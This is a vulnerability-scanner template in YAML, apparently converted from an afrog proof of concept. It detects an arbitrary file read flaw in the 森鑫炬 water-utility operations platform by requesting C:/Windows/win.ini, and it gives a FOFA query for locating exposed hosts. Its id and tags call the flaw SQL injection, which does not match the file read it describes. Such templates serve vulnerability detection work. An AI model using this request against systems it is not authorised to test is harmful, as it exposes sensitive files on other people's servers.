# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - for 16-bit app support
          - '[extensions]'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/Forms/Instance/Get?file=C:/Windows/win.ini'
id: shuiwu-formsinstanceget-sqli
info:
  author: avic123
  description: |
    森鑫炬水务企业综合运营平台 /Forms/Instance/Get 存在任意文件读取漏洞,攻击者可获取系统内部敏感文件内容，造成信息泄露。
    fofa：title="森鑫炬水务企业综合运营平台 - S8" || (body="Content/easyui.css" && body="重庆森鑫炬科技有限公司")
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 森鑫炬水务企业综合运营平台-FormsInstanceGet文件读取漏洞
  severity: high
  tags: shuiwu,sqli,argus-import
